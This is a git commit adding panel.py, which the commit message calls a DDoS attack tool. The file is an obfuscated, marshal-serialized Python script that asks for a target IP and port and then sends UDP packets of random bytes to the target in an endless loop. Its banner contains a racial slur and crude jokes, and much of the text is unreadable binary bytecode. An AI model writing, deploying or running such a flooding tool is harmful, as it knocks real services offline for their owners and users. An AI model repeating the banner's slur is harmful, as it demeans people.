9896ae62d5729ccc95ad06256b8d97b8c34ca0fb
hoodlineuser <raydenfredrick2@gmail.com>
2025-12-15 15:18:27 -0600

    Add panel.py for DDoS attack tool

---
+++ panel.py
@@ -0,0 +1,36 @@
+�
+b�t_c@s!ddlZejd�dUdS(i����Ns�c@s<ddlZddlZddlZddlZddlZddlmZej�ZejZejZej	Z	ej
+Z
+ejZejejej
+�Zejd�Zejd�dGHdGHdGHdGHd	GHd
+GHdGHdGHdGHdGHd
+GHdGHed�Zed�Zejd�dGHejd�ejd�dGHejd�ejd�dGHejd�ejd�dGHejd�ejd�dGHejd�ejd�dGHejd�ejd�dZx[er7ejeeef�edZedZdeeefGHedkr�dZq�q�WdS(i����N(tdatetimei�tclears�[1;31m
+Panel Made By Murk
+                                   /$$             /$$
+                                  | $$            | $$
+ /$$$$$$/$$$$  /$$   /$$  /$$$$$$ | $$   /$$  /$$$$$$$
+| $$_  $$_  $$| $$  | $$ /$$__  $$| $$  /$$/ /$$__  $$
+| $$ \ $$ \ $$| $$  | $$| $$  \__/| $$$$$$/ | $$  | $$
+| $$ | $$ | $$| $$  | $$| $$      | $$_  $$ | $$  | $$
+| $$ | $$ | $$|  $$$$$$/| $$      | $$ \  $$|  $$$$$$$
+|__/ |__/ |__/ \______/ |__/      |__/  \__/ \_______/
+                                                      
+                                                      
+                                                      s@[41m[1;37m  Distributed Denial Of Dildos - Tool [0mt s%[1;33mAuthor   : [1;37Murk764 s8[1;33mGithub   : [1;37mnigga s=[1;33mSource   : [1;37mFemboy For Life:3 s#[1;32mPress CTRL+C to stop sendings[1;37m------------ [0ms[1;37mINPUT TARGET [0ms$[37m[*] [91mIP or HOSTNAME :[32m s$[37m[*] [91mPORT SCANNING  :[32m s Run DDOS Attack.is Preparing DDoS Attack..s Run DDOS Attack...is%Sent %s packet to %s throught port:%si��(tsystosttimetsockettrandomRtnowthourtminutetdaytmonthtyeartAF_INETt
+SOCK_DGRAMtsockt_urandomtbytestsystemt	raw_inputtiptinputtporttsleeptsenttTruetsendto(((tt<module>sn					
+	
+
+
+
+
+
+
+
+
+
+
+
+
+	
+
+(tmarshaltloads(((sddos_.pyt<module>s
